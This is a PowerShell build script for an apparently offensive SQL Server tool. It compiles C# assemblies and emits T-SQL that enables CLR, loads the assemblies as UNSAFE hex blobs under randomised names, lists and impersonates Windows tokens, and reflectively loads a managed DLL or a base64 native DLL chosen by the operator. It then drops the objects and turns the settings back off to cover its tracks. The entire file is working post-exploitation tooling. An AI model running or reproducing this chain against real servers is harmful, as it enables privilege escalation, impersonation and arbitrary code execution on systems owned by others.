<#
.SYNOPSIS
    .\build.ps1 -option list [-show]
    .\build.ps1 -option whoami [-show]
    .\build.ps1 -option managed [-show]
    .\build.ps1 -option ummanaged [-show]
.DESCRIPTION
    This script compiles the neccesary assemblies used in the hansql.py script. It can also output the SQL commands to manually load the assemblies inline and perform the desired actions according to the given option.	
.PARAMETER Option
    -> list: Compile assembly that only lists available token handles
    -> whoami: Compile assembly that displays windows indentity    
    -> managed: Compile the assembly that lists tokens, impersonates and reflectively loads another given assembly. It also compiles this second assembly that is reflectively loaded
    -> unmanaged: Compile the assembly that only loads an unmanaged DLL, and also compile the assembly that lists tokens, impersonates and loads an unmanaged DLL
.PARAMETER Show
    Show the SQL commands to run on the SQL server
#>
Param([Parameter(Mandatory=$true)][string]$Option, [Parameter(Mandatory=$false)][switch]$Show = $false)

# This script compiles DLLs and outputs the SQL commands to be run on the server
# To provide your own managed or unmanaged DLL to be executed, just replace the test DLLs from managed/testdll.cs or unmanaged/testdll/testdll.sln with your own following the requisites. Check the README.md file for more information.

# Get arguments to choose an option
switch ($Option)
{
    "list" {write-output "[+] Compiling listing assembly..."; break}
    "whoami" {write-output "[+] Compiling whoami assembly..."; break}
    "managed" {write-output "[+] Compiling impersonating assembly and managed DLL assembly..."; break}
    "unmanaged" {write-output "[+] Compiling unmanaged DLL loader assembly and unmanaged DLL loader + impersonating assembly..."; break}
    default {"[!] Not a valid option"; Exit}
}

# C# compiler path, change as needed
$compilerpath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"

# String that will contain the SQL commands
$stringBuilder = New-Object -Type System.Text.StringBuilder 

# Name randomizer
$rand = Get-Random
$assemblyname1 = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
$assemblyname2 = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
$functionname1 = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
$functionname2 = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})

# Path variables
$pwd = Convert-Path $pwd
$scriptPath = Convert-Path $MyInvocation.MyCommand.Path
$Path = $scriptPath.Substring(0,$scriptPath.Length-9) + $Option + "\"
$oldPath = $Path + "old\"

#### Change BD configs ####
$stringBuilder.Append("use msdb`n") | Out-Null
$stringBuilder.AppendLine("GO") | Out-Null
$stringBuilder.AppendLine(" ") | Out-Null

# Enable show advanced options on the server
$stringBuilder.AppendLine("sp_configure 'show advanced options',1") | Out-Null
$stringBuilder.AppendLine("RECONFIGURE") | Out-Null
$stringBuilder.AppendLine("GO") | Out-Null
$stringBuilder.AppendLine(" ") | Out-Null

# Enable clr on the server
$stringBuilder.AppendLine("sp_configure 'clr enabled',1") | Out-Null
$stringBuilder.AppendLine("RECONFIGURE") | Out-Null
$stringBuilder.AppendLine("GO") | Out-Null
$stringBuilder.AppendLine(" ") | Out-Null


#### Output SQL commands to load and execute listing assembly ####
if($Option -eq "list")
{
    # Compile listing assembly
    $assemblyFile = $oldPath + $rand.ToString() + ".dll"
    $compileFile = $Path + "hansqllist.cs"
    cd $Path
    & $compilerpath /target:library /out:$assemblyFile $compileFile -nowarn:1691,618
    cd $pwd

    #### Load the token listing assembly #####
    # Build top of TSQL CREATE ASSEMBLY statement
    $stringBuilder.Append("CREATE ASSEMBLY [" + $assemblyname1 + "] AUTHORIZATION [dbo] FROM `n0x") | Out-Null
 
    # Read bytes from file
    $fileStream = [IO.File]::OpenRead($assemblyFile)
    while (($byte = $fileStream.ReadByte()) -gt -1) {
        $stringBuilder.Append($byte.ToString("X2")) | Out-Null
    }
	
    # Build bottom of TSQL CREATE ASSEMBLY statement
    $stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null
	
    # Build create function command
    $stringBuilder.AppendLine("CREATE FUNCTION [dbo]." + $functionname1 + "() RETURNS NVARCHAR(MAX) AS EXTERNAL NAME " + $assemblyname1 + ".program.run;") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null	

    # List available token handles
    $stringBuilder.AppendLine("SELECT dbo." + $functionname1 + "();") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Eliminate function
    $stringBuilder.Append("DROP FUNCTION " + $functionname1 + "`n") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Eliminate assembly
    $stringBuilder.Append("DROP ASSEMBLY " + $assemblyname1 + "`n") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null
}

#### Output SQL commands to load and execute whoami assembly ####
elseif($Option -eq "whoami")
{
    # Compile whoami assembly
    $assemblyFile = $oldPath + $rand.ToString() + ".dll"
    $compileFile = $Path + "whoami.cs"
    cd $Path
    & $compilerpath /target:library /out:$assemblyFile $compileFile -nowarn:1691,618
    cd $pwd

    #### Load the assembly #####
    # Build top of TSQL CREATE ASSEMBLY statement
    $stringBuilder.Append("CREATE ASSEMBLY [" + $assemblyname1 + "] AUTHORIZATION [dbo] FROM `n0x") | Out-Null
 
    # Read bytes from file
    $fileStream = [IO.File]::OpenRead($assemblyFile)
    while (($byte = $fileStream.ReadByte()) -gt -1) {
        $stringBuilder.Append($byte.ToString("X2")) | Out-Null
    }
	
	# Build bottom of TSQL CREATE ASSEMBLY statement
    $stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null
	
    # Build create function command
    $stringBuilder.AppendLine("CREATE FUNCTION [dbo]." + $functionname1 + "() RETURNS NVARCHAR(MAX) AS EXTERNAL NAME " + $assemblyname1 + ".program.run;") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null	

    # Output windows identity
    $stringBuilder.AppendLine("SELECT dbo." + $functionname1 + "();") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Eliminate function
    $stringBuilder.Append("DROP FUNCTION " + $functionname1 + "`n") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Eliminate assembly
    $stringBuilder.Append("DROP ASSEMBLY " + $assemblyname1 + "`n") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null	
}

#### Output SQL commands to load and execute impersonating + reflective loader assembly ####
elseif($Option -eq "managed")
{
    # Compile impersonating assembly
    $assemblyFile = $oldPath + "i" + $rand.ToString() + ".dll"
    $compileFile = $Path + "hansql.cs"
    # Compile assembly to be reflectively loaded by the impersonating assembly
    # Here you can change testdll for your own DLL that perform the actions you want
    # This DLL must have a dummy Do function so when it gets executed, the assembly is loaded into the SQL assembly table and can later be reflectively loaded. Check the README.md file for more information
    $assemblyFile2 = $oldPath + "r" + $rand.ToString() + ".dll"
    $compileFile2 = $Path + "testdll.cs"
    cd $Path
    & $compilerpath /target:library /out:$assemblyFile $compileFile -nowarn:1691,618
    & $compilerpath /target:library /out:$assemblyFile2 $compileFile2 -nowarn:1691,618
    cd $pwd

    #### Load testdll and execute the dummy function ####
    # Build top of TSQL CREATE ASSEMBLY statement
    $stringBuilder.Append("CREATE ASSEMBLY [" + $assemblyname1 + "] AUTHORIZATION [dbo] FROM `n0x") | Out-Null

    # Read bytes from file
    $fileStream2 = [IO.File]::OpenRead($assemblyFile2)
    while (($byte = $fileStream2.ReadByte()) -gt -1) {
        $stringBuilder.Append($byte.ToString("X2")) | Out-Null
    }

    # Build bottom of TSQL CREATE ASSEMBLY statement
    $stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Build create function command
    $stringBuilder.AppendLine("CREATE FUNCTION [dbo]." + $functionname1 + "() RETURNS NVARCHAR(MAX) AS EXTERNAL NAME " + $assemblyname1 + ".program.Do;") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Run dummy function
    $stringBuilder.AppendLine("SELECT dbo." + $functionname1 + "();") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    #### Load impersonating assembly #### 
    # Build top of TSQL CREATE ASSEMBLY statement
    $stringBuilder.Append("CREATE ASSEMBLY [" + $assemblyname2 + "] AUTHORIZATION [dbo] FROM `n0x") | Out-Null

    # Read bytes from file
    $fileStream = [IO.File]::OpenRead($assemblyFile)
    while (($byte = $fileStream.ReadByte()) -gt -1) {
        $stringBuilder.Append($byte.ToString("X2")) | Out-Null
    }

    # Build bottom of TSQL CREATE ASSEMBLY statement
    $stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Build create function command
    $stringBuilder.AppendLine("CREATE FUNCTION [dbo]." + $functionname2 + "(@h NVARCHAR(MAX), @n NVARCHAR(MAX)) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME " + $assemblyname2 + ".program.run;") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Output current windows identity
    $stringBuilder.AppendLine("SELECT dbo." + $functionname2 + "('w', '');") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # List available token handles
    $stringBuilder.AppendLine("SELECT dbo." + $functionname2 + "('l', '');") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Impersonate token handle and reflectively load testdll
    # DLL name is the name of the compiled testdll in disk whithout the .dll extension
    # It is going to be located in the managed/ folder, and has the format r<numbers>.dll
    $stringBuilder.AppendLine("SELECT dbo." + $functionname2 + "('tokenid', 'dllname');") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Eliminate function1
    $stringBuilder.Append("DROP FUNCTION " + $functionname2 + "`n") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Eliminate assembly1
    $stringBuilder.Append("DROP ASSEMBLY " + $assemblyname2 + "`n") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Eliminate function2
    $stringBuilder.Append("DROP FUNCTION " + $functionname1 + "`n") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Eliminate assembly2 
    $stringBuilder.Append("DROP ASSEMBLY " + $assemblyname1 + "`n") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null
}

#### Output SQL commands to load and execute impersonating + native DLL loader assembly ####
elseif($Option -eq "unmanaged")
{
    # Compile current user native DLL loader assembly
    $assemblyFile = $oldPath + "c" + $rand.ToString() + ".dll"
    $compileFile = $Path + "hansqlumngcu.cs"
    # Compile impersonating and native DLL loader assembly
    $assemblyFile2 = $oldPath + "i" + $rand.ToString() + ".dll"
    $compileFile2 = $Path + "hansqlumngimp.cs"
    cd $Path
    & $compilerpath /target:library /out:$assemblyFile $compileFile -nowarn:1691,618
    & $compilerpath /target:library /out:$assemblyFile2 $compileFile2 -nowarn:1691,618
    cd $pwd

    #### Load current user context native DLL loader assembly ####
    $stringBuilder.AppendLine("-- WITHOUT impersonation")
    # Build top of TSQL CREATE ASSEMBLY statement
    $stringBuilder.Append("CREATE ASSEMBLY [" + $assemblyname1 + "] AUTHORIZATION [dbo] FROM `n0x") | Out-Null

    # Read bytes from file
    $fileStream = [IO.File]::OpenRead($assemblyFile)
    while (($byte = $fileStream.ReadByte()) -gt -1) {
    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
    }

    # Build bottom of TSQL CREATE ASSEMBLY statement
    $stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Build create function command
    $stringBuilder.AppendLine("CREATE FUNCTION [dbo]." + $functionname1 + "(@d NVARCHAR(MAX)) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME " + $assemblyname1 + ".program.run;") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Load base 64 native DLL in current user context
    # Place your own base 64 native DLL Here
    # It must export a Run function that will be executed by the impersonating assembly. Check the README.md file for more information
    $stringBuilder.AppendLine("SELECT dbo." + $functionname1 + "('dllbase64');") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Eliminate function
    $stringBuilder.Append("DROP FUNCTION " + $functionname1 + "`n") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Eliminate assembly
    $stringBuilder.Append("DROP ASSEMBLY " + $assemblyname1 + "`n") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    #### Load impersonating + native DLL loader assembly #####
    $stringBuilder.AppendLine("-- WITH impersonation")
    # Build top of TSQL CREATE ASSEMBLY statement
    $stringBuilder.Append("CREATE ASSEMBLY [" + $assemblyname1 + "] AUTHORIZATION [dbo] FROM `n0x") | Out-Null

    # Read bytes from file
    $fileStream = [IO.File]::OpenRead($assemblyFile2)
    while (($byte = $fileStream.ReadByte()) -gt -1) {
        $stringBuilder.Append($byte.ToString("X2")) | Out-Null
    }

    # Build bottom of TSQL CREATE ASSEMBLY statement
    $stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Build create function command
    $stringBuilder.AppendLine("CREATE FUNCTION [dbo]." + $functionname1 + "(@us NVARCHAR(MAX), @d NVARCHAR(MAX)) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME " + $assemblyname1 + ".program.run;") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Output current windows identity
    $stringBuilder.AppendLine("SELECT dbo." + $functionname1 + "('w','');") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # List available token handles
    $stringBuilder.AppendLine("SELECT dbo." + $functionname1 + "('l','');") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Impersonate token and load base 64 native DLL
    # Place your own base 64 native DLL Here
    # It must export a Run function that will be executed by the impersonating assembly. Check the README.md file for more information
    $stringBuilder.AppendLine("SELECT dbo." + $functionname1 + "('tokenid','dllbase64');") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Eliminate function
    $stringBuilder.Append("DROP FUNCTION " + $functionname1 + "`n") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null

    # Eliminate assembly
    $stringBuilder.Append("DROP ASSEMBLY " + $assemblyname1 + "`n") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null
}

#### Revert changes in BD config ####
# Disable show advanced options on the server
$stringBuilder.AppendLine("sp_configure 'show advanced options',0") | Out-Null
$stringBuilder.AppendLine("RECONFIGURE") | Out-Null
$stringBuilder.AppendLine("GO") | Out-Null
$stringBuilder.AppendLine(" ") | Out-Null

# Disable clr on the server
$stringBuilder.AppendLine("sp_configure 'clr enabled',0") | Out-Null
$stringBuilder.AppendLine("RECONFIGURE") | Out-Null
$stringBuilder.AppendLine("GO") | Out-Null
$stringBuilder.AppendLine(" ") | Out-Null

#### Print SQL commands and clean old DLL files ####
# If show flag is provided, print all the SQL commands to run on the server
if($Show -eq $True)
{
    # Output all SQL commands
    $stringBuilder.ToString() -join ""
}

# Delete old dll files
$deletefiles = $Path + "*.dll"
del $deletefiles -erroraction 'silentlycontinue' 

# Copy the DLL so that only the newest is in the command folder, and the rest are in the old folder
Copy-Item -Path $assemblyFile -Destination $Path
if($assemblyFile2 -ne $null)
{
    Copy-Item -Path $assemblyFile2 -Destination $Path
}
	
# Try to delete old dll temp files
$deletefiles = $oldPath + "*.dll"
del $deletefiles -erroraction 'silentlycontinue' 
